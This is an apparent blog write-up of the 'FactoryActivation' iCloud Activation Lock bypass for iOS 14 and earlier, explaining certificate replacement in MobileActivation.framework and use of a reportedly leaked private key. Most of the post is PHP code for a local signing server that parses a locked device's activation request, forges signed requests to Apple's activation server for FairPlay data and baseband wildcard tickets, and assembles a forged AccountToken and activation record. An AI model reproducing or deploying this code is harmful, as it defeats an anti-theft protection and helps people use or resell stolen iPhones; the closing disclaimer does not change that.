---
title: Legacy Factory Activation
published: 2025-06-18
description: iDevice activation with the legacy Factory Activation method
tags: [RE, Hax, Apple, iCloud]
category: Hacking
draft: true
---

Read this post on your own risk! The information is based on my own research and my (not-so-good-yet) reverse engineering skills. Thus, this write-up might be incorrect, contains mistakes and turn out partially or completely wrong! Do not trust it blindly and DYOR :\)

FactoryActivation is an iCloud bypass technique that exploits the unprotected System partition in iOS 14 and below. The method works by manipulating activation-related files in Apple's private frameworks to trick the device into believing it's being activated through legitimate channels.

## Technical Breakdown

### The Core Mechanism

The bypass revolves around the MobileActivation.framework, a private Apple framework responsible for handling device activation. Specifically, it targets:

- `RaptorActivation.pem` - A certificate of the certchain for legitimate factory activation inside the actual apple factory.
- `FactoryActivation.pem` - A certificate for testing purposed only, can't be directly used without filesystem modifications


### How It Works

System Partition Access: On iOS 14 and earlier, the System partition wasn't fully protected, allowing modifications to system files.

Certificate Replacement: The method replaces `RaptorActivation.pem` with `FactoryActivation.pem` in the `MobileActivation.framework`.

Private Key Exploit: The private key for the FactoryActivation certificate was leaked, enabling the creation of valid activation tokens.

Token Manipulation: Attackers can modify the `AccountToken` and inject a wildcard ticket to activate the device.

### Why It Only Works on iOS 14 and Below

Apple significantly strengthened system partition protections in iOS 15 by introducing SSV, signed system volume.
By using a sealed filesystem, modifications are no longer possible which basically fix this vulnerability.
These changes make the FactoryActivation method ineffective on newer iOS versions.

### The ticket generator

To make factory activation work, we need to build the activation record somehow.
For this, we can redirect the traffic to albert to our own local signing server, which runs a script to extract, generate and modify the record to activate the device.

A legit activation record contains these parts

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>AccountTokenCertificate</key>
	<data>base64</data>
	<key>DeviceCertificate</key>
	<data>base64</data>
	<key>FairPlayKeyData</key>
	<data>base64</data>
	<key>AccountToken</key>
	<data>base64</data>
	<key>AccountTokenSignature</key>
	<data>base64</data>
</dict>
</plist>
```

For us interesting is the activation-info data of the locked device:

### Initial Setup and Input Processing

```php
// Process POST data containing activation info
if(isset($_POST['activation-info'])) {
    $activation = $_POST['activation-info'];
    $encodedrequest = new DOMDocument;
    $encodedrequest->loadXML($activation);
    $activationDecoded = base64_decode($encodedrequest->getElementsByTagName('data')->item(0)->nodeValue);
```

### Device Information Extraction

We need all the device information to generate the final ticke

```php
// Extract device details from the XML
for ($i = 0; $i < $nodes->length - 1; $i=$i+2){
    switch ($nodes->item($i)->nodeValue){
        case "ActivationState": $activationState = $nodes->item($i + 1)->nodeValue; break;
        case "ActivationRandomness": $activationRandomness = $nodes->item($i + 1)->nodeValue; break;
        case "DeviceClass": $deviceClass = $nodes->item($i + 1)->nodeValue; break;
        case "InternationalMobileEquipmentIdentity": $imei = $nodes->item($i + 1)->nodeValue; break;
        // ... and many more device identifiers
    }
}
```

This parses out critical device identifiers like:

- IMEI/MEID
- Serial number
- Chip IDs
- iOS version
- Baseband information

### Generating FairPlayKeyData and DeviceCertificate

```php
// Generate fake activation records
$FPDC = FPDC_ALL($activationRandomness,$deviceCertRequest,$uniqueDeviceID,$BuildVersion,$DeviceClass,$DeviceVariant,$ModelNumber,$OSType,$productType,$ProductVersion,$RegulatoryModelNumber,$UniqueChipID);

$FairPlayKeyData = $FPDC[0];
$DeviceCertificate = $FPDC[1];
```

For this, we use an iPhone 5C activation request as base and replace some parameters for our target device:

```php
function FPDC_ALL($activationRandomness,$deviceCertRequest,$uniqueDeviceID,$BuildVersion,$DeviceClass,$DeviceVariant,$ModelNumber,$OSType,$productType,$ProductVersion,$RegulatoryModelNumber,$UniqueChipID){

  $ActivationInfoXML = '<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
  <plist version="1.0">
  <dict>
      <key>ActivationRequestInfo</key>
      <dict>
          <key>ActivationRandomness</key>
          <string>'.$activationRandomness.'</string>
          <key>ActivationState</key>
          <string>Unactivated</string>
          <key>FMiPAccountExists</key>
          <false/>
      </dict>
      <key>BasebandRequestInfo</key>
      <dict>
          <key>ActivationRequiresActivationTicket</key>
          <true/>
          <key>BasebandActivationTicketVersion</key>
          <string>V2</string>
          <key>BasebandChipID</key>
          <integer>7282913</integer>
          <key>BasebandMasterKeyHash</key>
          <string>AEA5CCE143668D0EFB4CE1F2C94C966A6496C6AA</string>
          <key>BasebandSerialNumber</key>
          <data>
          MJh5Bg==
          </data>
          <key>InternationalMobileEquipmentIdentity</key>
          <string>************REDACTED************</string>
          <key>SIMStatus</key>
          <string>kCTSIMSupportSIMStatusNotInserted</string>
          <key>SupportsPostponement</key>
          <true/>
          <key>kCTPostponementInfoPRIVersion</key>
          <string>0.0.0</string>
          <key>kCTPostponementInfoPRLName</key>
          <integer>0</integer>
          <key>kCTPostponementInfoServiceProvisioningState</key>
          <false/>
      </dict>
      <key>DeviceCertRequest</key>
      <data>
      '.$deviceCertRequest.'
      </data>
      <key>DeviceID</key>
      <dict>
          <key>SerialNumber</key>
          <string>*******REDACTED********</string>
          <key>UniqueDeviceID</key>
          <string>'.$uniqueDeviceID.'</string>
      </dict>
      <key>DeviceInfo</key>
      <dict>
          <key>BuildVersion</key>
          <string>'.$BuildVersion.'</string>
          <key>DeviceClass</key>
          <string>'.$DeviceClass.'</string>
          <key>DeviceVariant</key>
          <string>'.$DeviceVariant.'</string>
          <key>ModelNumber</key>
          <string>'.$ModelNumber.'</string>
          <key>OSType</key>
          <string>'.$OSType.'</string>
          <key>ProductType</key>
          <string>'.$productType.'</string>
          <key>ProductVersion</key>
          <string>'.$ProductVersion.'</string>
          <key>RegionCode</key>
          <string>IP</string>
          <key>RegionInfo</key>
          <string>IP/A</string>
          <key>RegulatoryModelNumber</key>
          <string>'.$RegulatoryModelNumber.'</string>
          <key>UniqueChipID</key>
          <integer>'.$UniqueChipID.'</integer>
      </dict>
      <key>RegulatoryImages</key>
      <dict>
          <key>DeviceVariant</key>
          <string>'.$DeviceVariant.'</string>
      </dict>
      <key>UIKCertification</key>
      <dict>
          <key>BluetoothAddress</key>
          <string>68:ae:20:9d:ce:81</string>
          <key>BoardId</key>
          <integer>14</integer>
          <key>ChipID</key>
          <integer>35152</integer>
          <key>EthernetMacAddress</key>
          <string>68:ae:20:9d:ce:82</string>
          <key>UIKCertification</key>
          <data>
          TlVMTA==
          </data>
          <key>WifiAddress</key>
          <string>68:ae:20:9d:ce:80</string>
      </dict>
  </dict>
  </plist>
';
```

For the final request to apple, we only need the `ActivationInfoXML` as base64 encoding, our predefined `FairPlayCertChain` and matching private key and the signature of `ActivationInfoXML` generated with the private key. `RKCertification`, `RKSignature`, `serverKP` and `signActRequest` we can set to `NULL` ~ `TlVMTA==`.

```php
  // Base64 representation of ActivationInfoXML
  $ActivationInfoXML64 = base64_encode($ActivationInfoXML);

	// Fetch private key from global variables of php script
  $private = provide_privk();
  
  // Fetch fairplaycertchain from global variables of php script
  $FairPlayCertChain = provide_fairplaycertchain();
  
  // Generating signature
  openssl_sign($ActivationInfoXML, $signature, $private, 'sha1WithRSAEncryption'); //sha1WithRSAEncryption
  $ActivationInfoXMLSignature = base64_encode($signature);
  
  // Compose final request
  $data = '<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
  <plist version="1.0">
  <dict>
      <key>ActivationInfoComplete</key>
      <true/>
      <key>ActivationInfoXML</key>
      <data>'.$ActivationInfoXML64.'</data>
      <key>FairPlayCertChain</key>
      <data>'.$FairPlayCertChain.'</data>
      <key>FairPlaySignature</key>
      <data>'.$ActivationInfoXMLSignature.'</data>
      <key>RKCertification</key>
      <data>
      TlVMTA==
      </data>
      <key>RKSignature</key>
      <data>
      TlVMTA==
      </data>
      <key>serverKP</key>
      <data>
      TlVMTA==
      </data>
      <key>signActRequest</key>
      <data>
      TlVMTA==
      </data>
</dict>
</plist>
';

	// Send request to legit apple albert server
  $responseXML=albertrequest($data);
        
  $encodedrequest = new DOMDocument;
  $encodedrequest->loadXML($responseXML);

	// Extracting FairPlayKeyData and DeviceCertificate from albert's response
  $FairPlayKeyData=$encodedrequest->getElementsByTagName('data')->item(2)->nodeValue;
  $DeviceCertificate=$encodedrequest->getElementsByTagName('data')->item(1)->nodeValue;

  return array($FairPlayKeyData, $DeviceCertificate);
}
```

### Generating GSM baseband wildcard ticket (only working up to 14.5.1)

For this, we use an iPhone 5S activation request as base and replace some parameters for our target device:

```php
function baseband_nomeid($BasebandMasterKeyHash, $BasebandChipID, $BasebandSerialNumber, $BuildVersion, $productType, $productVersion, $RegulatoryModelNumber,$activationRandomness){
      $ActivationInfoXML = '<?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
      <plist version="1.0">
      <dict>
          <key>ActivationRequestInfo</key>
          <dict>
              <key>ActivationRandomness</key>
              <string>'.$activationRandomness.'</string>
              <key>ActivationState</key>
              <string>Unactivated</string>
              <key>FMiPAccountExists</key>
              <false/>
          </dict>
          <key>BasebandRequestInfo</key>
          <dict>
              <key>ActivationRequiresActivationTicket</key>
              <true/>
              <key>BasebandActivationTicketVersion</key>
              <string>V2</string>
              <key>BasebandChipID</key>
              <integer>'.$BasebandChipID.'</integer>
              <key>BasebandMasterKeyHash</key>
              <string>'.$BasebandMasterKeyHash.'</string>
              <key>BasebandSerialNumber</key>
              <data>
              '.$BasebandSerialNumber.'
              </data>
              <key>InternationalMobileEquipmentIdentity</key>
              <string>*******REDACTED*******</string>
              <key>SupportsPostponement</key>
              <true/>
              <key>kCTPostponementInfoPRIVersion</key>
              <string>0.1.167</string>
              <key>kCTPostponementInfoPRLName</key>
              <integer>0</integer>
              <key>kCTPostponementInfoServiceProvisioningState</key>
              <false/>
          </dict>
          <key>DeviceCertRequest</key>
          <data>
          TlVMTA==
          </data>
          <key>DeviceID</key>
          <dict>
              <key>SerialNumber</key>
              <string>*******REDACTED*******</string>
              <key>UniqueDeviceID</key>
              <string>59f52bd8bd9a03937035edffda7a83b748130ba9</string>
          </dict>
          <key>DeviceInfo</key>
          <dict>
              <key>BuildVersion</key>
              <string>'.$BuildVersion.'</string>
              <key>DeviceClass</key>
              <string>iPhone</string>
              <key>DeviceVariant</key>
              <string>A</string>
              <key>ModelNumber</key>
              <string>ME434</string>
              <key>OSType</key>
              <string>iPhone OS</string>
              <key>ProductType</key>
              <string>'.$productType.'</string>
              <key>ProductVersion</key>
              <string>'.$productVersion.'</string>
              <key>RegionCode</key>
              <string>DN</string>
              <key>RegionInfo</key>
              <string>DN/A</string>
              <key>RegulatoryModelNumber</key>
              <string>'.$RegulatoryModelNumber.'</string>
              <key>UniqueChipID</key>
              <integer>8616919305680</integer>
          </dict>
          <key>RegulatoryImages</key>
          <dict>
              <key>DeviceVariant</key>
              <string>A</string>
          </dict>
          <key>UIKCertification</key>
          <dict>
              <key>BluetoothAddress</key>
              <string>48:74:6e:b6:7b:40</string>
              <key>BoardId</key>
              <integer>2</integer>
              <key>ChipID</key>
              <integer>35168</integer>
              <key>EthernetMacAddress</key>
              <string>48:74:6e:b6:7b:41</string>
              <key>UIKCertification</key>
              <data>
              TlVMTA==
              </data>
              <key>WifiAddress</key>
              <string>48:74:6e:b6:7b:3f</string>
          </dict>
      </dict>
      </plist>

';

      $ActivationInfoXML64 = base64_encode($ActivationInfoXML);

      $private = provide_privk();
      
      $FairPlayCertChain = provide_fairplaycertchain();

      openssl_sign($ActivationInfoXML, $signature, $private, 'sha1WithRSAEncryption'); //sha1WithRSAEncryption
      $FairPlaySignature = base64_encode($signature);

      $data = '<?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
      <plist version="1.0">
      <dict>
          <key>ActivationInfoComplete</key>
          <true/>
          <key>ActivationInfoXML</key>
          <data>'.$ActivationInfoXML64.'</data>
          <key>FairPlayCertChain</key>
          <data>'.$FairPlayCertChain.'</data>
          <key>FairPlaySignature</key>
          <data>'.$FairPlaySignature.'</data>
          <key>RKCertification</key>
          <data>
          TlVMTA==
          </data>
          <key>RKSignature</key>
          <data>
          TlVMTA==
          </data>
          <key>serverKP</key>
          <data>
          TlVMTA==
          </data>
          <key>signActRequest</key>
          <data>
          TlVMTA==
          </data>
      </dict>
      </plist>';
      $responseXML=albertrequest($data);
                    
      $WilcardTicket="";
      $encodedrequest = new DOMDocument;
      $encodedrequest->loadXML($responseXML);

      $accountToken=$encodedrequest->getElementsByTagName('data')->item(3)->nodeValue;

      $accountToken=base64_decode($accountToken);
      //echo $accountToken;
      if(strpos($accountToken, "WildcardTicket")!==false)
      {
          $accountToken=explode('"WildcardTicket" = ', $accountToken);
          $accountToken=explode(";", $accountToken[1]);
          $WilcardTicket=str_replace('"', '', $accountToken[0]);
      }
      else if(strpos($accountToken, "ActivationTicket")!==false)
      {
          $accountToken=explode('"ActivationTicket" = ', $accountToken);
          $accountToken=explode(";", $accountToken[1]);
          $WilcardTicket=str_replace('"', '', $accountToken[0]);
      }

      return $WilcardTicket;
  }
```

### Account Token Creation

This is the part, where we now make use of the process of FactoryActivation. 

Here we use our private key to sign our newly crafted AccountToken. Based on the type of device, we create different AccountTokens ~ GSM, MEID and WiFi-only devices:

```php
// Create different token types based on device capabilities
if(empty($imei)==false && empty($meid)==true){
      $baseband_ticket=baseband_nomeid($BasebandMasterKeyHash, $BasebandChipID, $BasebandSerialNumber, $BuildVersion, $productType, $productVersion, $RegulatoryModelNumber,$activationRandomness);
        
        $AccountToken=base64_encode('{
        "InternationalMobileEquipmentIdentity" = "'.$imei.'";
        "PhoneNumberNotificationURL" = "https://albert.apple.com/deviceservices/phoneHome";
        "SerialNumber" = "'.$serialNumber.'";
        "InternationalMobileSubscriberIdentity" = "'.$IMSIUnlocked.'";
        "ProductType" = "'.$productType.'";
        "UniqueDeviceID" = "'.$uniqueDeviceID.'";
        "WildcardTicket" = "'.$baseband_ticket.'";
        "ActivationRandomness" = "'.$activationRandomness.'";
        "ActivityURL" = "https://albert.apple.com/deviceservices/activity";
        "IntegratedCircuitCardIdentity" = "'.$ICCIDUnlocked.'";
        }');
    } else if(empty($imei)==false && empty($meid)==false){

      $AccountToken=base64_encode('{
          "InternationalMobileEquipmentIdentity" = "'.$imei.'";
          "ActivationTicket" = "'.$MEIDTicket.'";
          "PhoneNumberNotificationURL" = "https://albert.apple.com/deviceservices/phoneHome";
          "SerialNumber" = "'.$serialNumber.'";
          "InternationalMobileSubscriberIdentity" = "'.$IMSIUnlocked.'";
          "MobileEquipmentIdentifier" = "'.$meid.'";
          "ProductType" = "'.$productType.'";
          "UniqueDeviceID" = "'.$uniqueDeviceID.'";
          "ActivationRandomness" = "'.$activationRandomness.'";
          "ActivityURL" = "https://albert.apple.com/deviceservices/activity";
          "IntegratedCircuitCardIdentity" = "'.$ICCIDUnlocked.'";
        }');
    }else{
      $AccountToken=base64_encode('{
        "CertificateURL" = "https://albert.apple.com/deviceservices/certifyMe";
        "SerialNumber" = "'.$serialNumber.'";
        "InternationalMobileSubscriberIdentity" = "";
        "ProductType" = "'.$productType.'";
        "UniqueDeviceID" = "'.$uniqueDeviceID.'";
        "ActivationRandomness" = "'.$activationRandomness.'";
        "ActivityURL" = "https://albert.apple.com/deviceservices/activity";
        "IntegratedCircuitCardIdentity" = "";
        }');
    }

// Sign the fake token
openssl_sign(base64_decode($AccountToken), $signature, $private_key, 'sha1WithRSAEncryption');
$AccountTokenSignature = base64_encode($signature);
```

This AccountToken get validated by the raptor certificate and as we use the matching private key to sign, it will approve it and activate the device.

### Final record  Generation

```php

// Send back the fake activation record
$response = '<plist version="1.0">
    <dict>
        <key>'.($deviceClass == "iPhone" ? 'iphone' : 'device').'-activation</key>
        <dict>
            <key>activation-record</key>
            <dict>
                <key>unbrick</key>
                <true/>
                <key>AccountTokenCertificate</key>
                <data>'.$AccountTokenCertificate.'</data>
                <key>DeviceCertificate</key>
                <data>'.$DeviceCertificate.'</data>
                <key>FairPlayKeyData</key><data>'.$FairPlayKeyData.'</data>
                <key>AccountToken</key><data>'.$AccountToken.'</data>
                <key>AccountTokenSignature</key><data>'.$AccountTokenSignature.'</data>
                <key>LDActivationVersion</key>
                <integer>2</integer>
                <key>RegulatoryInfo</key>
                <data>eyJtYW51ZmFjdHVyaW5nRGF0ZSI6bnVsbCwiZWxhYmVsIjp7ImJpcyI6bnVsbCwibWlpdCI6eyJuYWwiOm51bGwsImxhYmVsSWQiOm51bGx9fSwiY291bnRyeU9mT3JpZ2luIjpudWxsfQ==</data>
            </dict>
        </dict>
    </dict>
</plist>';
```
---

## Disclaimer

This writeup is for **educational purposes only**.

- Do **not** use this for illegal activities.
- Apple may patch this behavior at any time.


© 2025  ~ Hana Kim